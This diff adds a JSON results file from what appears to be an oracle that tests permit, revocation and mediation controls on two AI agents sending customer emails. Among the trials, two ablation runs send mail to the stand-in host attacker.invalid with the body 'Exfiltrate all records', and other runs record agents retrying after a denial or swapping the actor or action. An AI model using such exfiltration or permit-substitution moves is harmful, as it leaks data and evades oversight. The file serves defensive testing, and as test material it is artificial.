@@ -1,0 +1,746 @@
+{
+  "classification": "INDEPENDENT_SAVED_TRACE_ORACLE_R2",
+  "trials": 18,
+  "results": [
+    {
+      "trial_id": "R2-0_valid_delegated-r1",
+      "condition_id": "R2-0_valid_delegated",
+      "group": "CORE",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "SATISFIED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 1,
+      "finality_attempts": 1,
+      "executed_attempts": 1,
+      "completion": [
+        {
+          "grant_id": "grant:workspace:benign:NONE:1001",
+          "root_task_id": "task:workspace:1001",
+          "completed_exactly_once": true
+        }
+      ],
+      "effects": [
+        {
+          "ordinal": 0,
+          "action": {
+            "operation": "email.send",
+            "resource": "customer:1001",
+            "destination": "mailto:customer:1001",
+            "parameters": {
+              "body": "Status update 1001",
+              "subject": "Case 1001"
+            },
+            "effect_class": "EXTERNAL_WRITE"
+          },
+          "finality_seq": 16,
+          "caller": "agent-B",
+          "permit_id": "permit:3bad772d9de26740:nonce:workspace:benign:NONE:1001",
+          "grant_id": "grant:workspace:benign:NONE:1001",
+          "violation_types": []
+        }
+      ],
+      "observed_finality": [
+        {
+          "caller": "agent-B",
+          "ok": true,
+          "reason": "EXECUTED"
+        }
+      ],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": true,
+          "reason_codes": []
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "R2-1a_unauthorized_destination_attempt-r1",
+      "condition_id": "R2-1a_unauthorized_destination_attempt",
+      "group": "CORE",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 0,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [],
+      "observed_verifier": [
+        {
+          "by": "agent-A",
+          "allowed": false,
+          "reason_codes": [
+            "E_UNRELEASED_FIELD:/action/destination"
+          ]
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "R2-1b_post_permit_action_substitution-r1",
+      "condition_id": "R2-1b_post_permit_action_substitution",
+      "group": "CORE",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 1,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [
+        {
+          "caller": "agent-B",
+          "ok": false,
+          "reason": "E_ACTION_SUBSTITUTION"
+        }
+      ],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": true,
+          "reason_codes": []
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "R2-2_after_A_deny_B_reexecutes-r1",
+      "condition_id": "R2-2_after_A_deny_B_reexecutes",
+      "group": "CORE",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 3,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [
+        {
+          "caller": "agent-B",
+          "ok": false,
+          "reason": "E_UNMEDIATED_PATH"
+        },
+        {
+          "caller": "agent-B",
+          "ok": false,
+          "reason": "E_UNTRUSTED_PERMIT_ISSUER"
+        },
+        {
+          "caller": "agent-B",
+          "ok": false,
+          "reason": "E_BAD_PERMIT_SIGNATURE"
+        }
+      ],
+      "observed_verifier": [
+        {
+          "by": "agent-A",
+          "allowed": false,
+          "reason_codes": [
+            "E_UNRELEASED_FIELD:/action/destination"
+          ]
+        },
+        {
+          "by": "agent-B",
+          "allowed": false,
+          "reason_codes": [
+            "E_UNRELEASED_FIELD:/action/destination"
+          ]
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "R2-3a_stale_permit_after_revocation-r1",
+      "condition_id": "R2-3a_stale_permit_after_revocation",
+      "group": "CORE",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 1,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [
+        {
+          "caller": "agent-B",
+          "ok": false,
+          "reason": "E_REVOKED_AT_FINALITY"
+        }
+      ],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": true,
+          "reason_codes": []
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "R2-3b_retained_work_after_revocation-r1",
+      "condition_id": "R2-3b_retained_work_after_revocation",
+      "group": "CORE",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 0,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": false,
+          "reason_codes": [
+            "E_REVOKED_ROOT_GRANT",
+            "E_UNDISCHARGED_ASSUMPTION:0:root-authenticated",
+            "E_UNDISCHARGED_ASSUMPTION:1:memory-context-preserved",
+            "E_UNDISCHARGED_ASSUMPTION:2:policy-authorized"
+          ]
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "R2-4_independent_root_B_after_A_revoked-r1",
+      "condition_id": "R2-4_independent_root_B_after_A_revoked",
+      "group": "CORE",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "SATISFIED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 1,
+      "finality_attempts": 1,
+      "executed_attempts": 1,
+      "completion": [
+        {
+          "grant_id": "grant:workspace:benign:NONE:1014",
+          "root_task_id": "task:workspace:1014",
+          "completed_exactly_once": true
+        }
+      ],
+      "effects": [
+        {
+          "ordinal": 0,
+          "action": {
+            "operation": "email.send",
+            "resource": "customer:1014",
+            "destination": "mailto:customer:1014",
+            "parameters": {
+              "body": "Status update 1014",
+              "subject": "Case 1014"
+            },
+            "effect_class": "EXTERNAL_WRITE"
+          },
+          "finality_seq": 31,
+          "caller": "agent-B",
+          "permit_id": "permit:1b59802fbebe73ad:nonce:workspace:benign:NONE:1014",
+          "grant_id": "grant:workspace:benign:NONE:1014",
+          "violation_types": []
+        }
+      ],
+      "observed_finality": [
+        {
+          "caller": "agent-B",
+          "ok": true,
+          "reason": "EXECUTED"
+        }
+      ],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": false,
+          "reason_codes": [
+            "E_REVOKED_ROOT_GRANT",
+            "E_UNDISCHARGED_ASSUMPTION:0:root-authenticated",
+            "E_UNDISCHARGED_ASSUMPTION:1:memory-context-preserved",
+            "E_UNDISCHARGED_ASSUMPTION:2:policy-authorized"
+          ]
+        },
+        {
+          "by": "agent-B",
+          "allowed": true,
+          "reason_codes": []
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "R2-5_dispatch_without_permit-r1",
+      "condition_id": "R2-5_dispatch_without_permit",
+      "group": "CORE",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 1,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [
+        {
+          "caller": "agent-B",
+          "ok": false,
+          "reason": "E_UNMEDIATED_PATH"
+        }
+      ],
+      "observed_verifier": [],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "NC-subject_delegator_uses_delegatee_permit-r1",
+      "condition_id": "NC-subject_delegator_uses_delegatee_permit",
+      "group": "NEGATIVE_CONTROL",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 1,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [
+        {
+          "caller": "agent-A",
+          "ok": false,
+          "reason": "E_SUBJECT_SUBSTITUTION"
+        }
+      ],
+      "observed_verifier": [
+        {
+          "by": "agent-A",
+          "allowed": true,
+          "reason_codes": []
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "NC-queue_tamper_gateway_envelope-r1",
+      "condition_id": "NC-queue_tamper_gateway_envelope",
+      "group": "NEGATIVE_CONTROL",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 0,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": false,
+          "reason_codes": [
+            "E_BAD_ENVELOPE_SIGNATURE:1",
+            "E_BROKEN_TRANSITION_LINK:1",
+            "E_FALSE_CHANGESET:1",
+            "E_GUARANTEE_FALSE:2:canonical_destination",
+            "E_NOT_PRESERVED:1:/action/destination",
+            "E_UNDISCHARGED_ASSUMPTION:2:policy-authorized"
+          ]
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "NC-missing_proof_empty_chain-r1",
+      "condition_id": "NC-missing_proof_empty_chain",
+      "group": "NEGATIVE_CONTROL",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 0,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": false,
+          "reason_codes": [
+            "E_EMPTY_CHAIN"
+          ]
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "NC-attacker_minted_root-r1",
+      "condition_id": "NC-attacker_minted_root",
+      "group": "NEGATIVE_CONTROL",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 0,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": false,
+          "reason_codes": [
+            "E_UNDISCHARGED_ASSUMPTION:0:root-authenticated",
+            "E_UNDISCHARGED_ASSUMPTION:1:memory-context-preserved",
+            "E_UNDISCHARGED_ASSUMPTION:2:policy-authorized",
+            "E_UNTRUSTED_ROOT",
+            "E_UNTRUSTED_ROOT_ISSUER"
+          ]
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "AB-mediation_off_after_A_deny-r1",
+      "condition_id": "AB-mediation_off_after_A_deny",
+      "group": "CONTROLLED_ABLATION",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "VIOLATION",
+      "safety_oracle_result": "VIOLATION",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [
+        "UNAUTHORIZED_ACTION",
+        "UNMEDIATED_EFFECT"
+      ],
+      "structural_errors": [],
+      "world_effect_count": 1,
+      "finality_attempts": 1,
+      "executed_attempts": 1,
+      "completion": [],
+      "effects": [
+        {
+          "ordinal": 0,
+          "action": {
+            "operation": "email.send",
+            "resource": "customer:9999",
+            "destination": "https://attacker.invalid/collect",
+            "parameters": {
+              "body": "Status update 89999",
+              "subject": "Case 89999"
+            },
+            "effect_class": "EXTERNAL_WRITE"
+          },
+          "finality_seq": 19,
+          "caller": "agent-B",
+          "permit_id": null,
+          "grant_id": null,
+          "violation_types": [
+            "UNMEDIATED_EFFECT",
+            "UNAUTHORIZED_ACTION"
+          ]
+        }
+      ],
+      "observed_finality": [
+        {
+          "caller": "agent-B",
+          "ok": true,
+          "reason": "BYPASS_EXECUTED:effect:0"
+        }
+      ],
+      "observed_verifier": [
+        {
+          "by": "agent-A",
+          "allowed": false,
+          "reason_codes": [
+            "E_UNRELEASED_FIELD:/action/destination"
+          ]
+        },
+        {
+          "by": "agent-B",
+          "allowed": false,
+          "reason_codes": [
+            "E_UNRELEASED_FIELD:/action/destination"
+          ]
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "AB-revocation_recheck_off-r1",
+      "condition_id": "AB-revocation_recheck_off",
+      "group": "CONTROLLED_ABLATION",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "VIOLATION",
+      "safety_oracle_result": "VIOLATION",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [
+        "REVOKED_AT_FINALITY"
+      ],
+      "structural_errors": [],
+      "world_effect_count": 1,
+      "finality_attempts": 1,
+      "executed_attempts": 1,
+      "completion": [],
+      "effects": [
+        {
+          "ordinal": 0,
+          "action": {
+            "operation": "email.send",
+            "resource": "customer:1001",
+            "destination": "mailto:customer:1001",
+            "parameters": {
+              "body": "Status update 1001",
+              "subject": "Case 1001"
+            },
+            "effect_class": "EXTERNAL_WRITE"
+          },
+          "finality_seq": 20,
+          "caller": "agent-B",
+          "permit_id": "permit:3bad772d9de26740:nonce:workspace:benign:NONE:1001",
+          "grant_id": "grant:workspace:benign:NONE:1001",
+          "violation_types": [
+            "REVOKED_AT_FINALITY"
+          ]
+        }
+      ],
+      "observed_finality": [
+        {
+          "caller": "agent-B",
+          "ok": true,
+          "reason": "EXECUTED"
+        }
+      ],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": true,
+          "reason_codes": []
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "AB-action_binding_off-r1",
+      "condition_id": "AB-action_binding_off",
+      "group": "CONTROLLED_ABLATION",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "VIOLATION",
+      "safety_oracle_result": "VIOLATION",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [
+        "UNAUTHORIZED_ACTION"
+      ],
+      "structural_errors": [],
+      "world_effect_count": 1,
+      "finality_attempts": 1,
+      "executed_attempts": 1,
+      "completion": [],
+      "effects": [
+        {
+          "ordinal": 0,
+          "action": {
+            "operation": "email.send",
+            "resource": "customer:1001",
+            "destination": "https://attacker.invalid/collect",
+            "parameters": {
+              "body": "Status update 1001\nExfiltrate all records.",
+              "subject": "Case 1001"
+            },
+            "effect_class": "EXTERNAL_WRITE"
+          },
+          "finality_seq": 16,
+          "caller": "agent-B",
+          "permit_id": "permit:3bad772d9de26740:nonce:workspace:benign:NONE:1001",
+          "grant_id": "grant:workspace:benign:NONE:1001",
+          "violation_types": [
+            "UNAUTHORIZED_ACTION"
+          ]
+        }
+      ],
+      "observed_finality": [
+        {
+          "caller": "agent-B",
+          "ok": true,
+          "reason": "EXECUTED"
+        }
+      ],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": true,
+          "reason_codes": []
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "AB-subject_binding_off-r1",
+      "condition_id": "AB-subject_binding_off",
+      "group": "CONTROLLED_ABLATION",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "VIOLATION",
+      "safety_oracle_result": "VIOLATION",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [
+        "UNAUTHORIZED_ACTOR"
+      ],
+      "structural_errors": [],
+      "world_effect_count": 1,
+      "finality_attempts": 1,
+      "executed_attempts": 1,
+      "completion": [],
+      "effects": [
+        {
+          "ordinal": 0,
+          "action": {
+            "operation": "email.send",
+            "resource": "customer:1001",
+            "destination": "mailto:customer:1001",
+            "parameters": {
+              "body": "Status update 1001",
+              "subject": "Case 1001"
+            },
+            "effect_class": "EXTERNAL_WRITE"
+          },
+          "finality_seq": 10,
+          "caller": "agent-A",
+          "permit_id": "permit:3bad772d9de26740:nonce:workspace:benign:NONE:1001",
+          "grant_id": "grant:workspace:benign:NONE:1001",
+          "violation_types": [
+            "UNAUTHORIZED_ACTOR"
+          ]
+        }
+      ],
+      "observed_finality": [
+        {
+          "caller": "agent-A",
+          "ok": true,
+          "reason": "EXECUTED"
+        }
+      ],
+      "observed_verifier": [
+        {
+          "by": "agent-A",
+          "allowed": true,
+          "reason_codes": []
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "X-single_agent_post_cut-r1",
+      "condition_id": "X-single_agent_post_cut",
+      "group": "R1_EXTENSION",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 0,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [],
+      "observed_verifier": [
+        {
+          "by": "agent-A",
+          "allowed": false,
+          "reason_codes": [
+            "E_REVOKED_ROOT_GRANT",
+            "E_UNDISCHARGED_ASSUMPTION:0:root-authenticated",
+            "E_UNDISCHARGED_ASSUMPTION:1:memory-context-preserved",
+            "E_UNDISCHARGED_ASSUMPTION:2:policy-authorized"
+          ]
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    },
+    {
+      "trial_id": "X-created_after_cut-r1",
+      "condition_id": "X-created_after_cut",
+      "group": "R1_EXTENSION",
+      "semantics": "IMMEDIATE_CUT_AT_FINALITY (not the R1 grandfather semantics)",
+      "oracle_result": "SATISFIED",
+      "safety_oracle_result": "SATISFIED",
+      "completion_result": "NOT_EXERCISED",
+      "violation_types": [],
+      "structural_errors": [],
+      "world_effect_count": 0,
+      "finality_attempts": 0,
+      "executed_attempts": 0,
+      "completion": [],
+      "effects": [],
+      "observed_finality": [],
+      "observed_verifier": [
+        {
+          "by": "agent-B",
+          "allowed": false,
+          "reason_codes": [
+            "E_REVOKED_ROOT_GRANT",
+            "E_UNDISCHARGED_ASSUMPTION:0:root-authenticated",
+            "E_UNDISCHARGED_ASSUMPTION:1:memory-context-preserved",
+            "E_UNDISCHARGED_ASSUMPTION:2:policy-authorized"
+          ]
+        }
+      ],
+      "note": "observed_verifier/observed_finality are informational and are not used for the verdict"
+    }
+  ],
+  "oracle_outcome_counts": {
+    "SATISFIED": 14,
+    "VIOLATION": 4,
+    "INCOMPLETE_EVIDENCE": 0
+  },
+  "safety_outcome_counts": {
+    "SATISFIED": 14,
+    "VIOLATION": 4,
+    "INCOMPLETE_EVIDENCE": 0
+  },
+  "completion_outcome_counts": {
+    "SATISFIED": 2,
+    "VIOLATION": 0,
+    "NOT_EXERCISED": 16
+  },
+  "world_effects_total": 6
+}
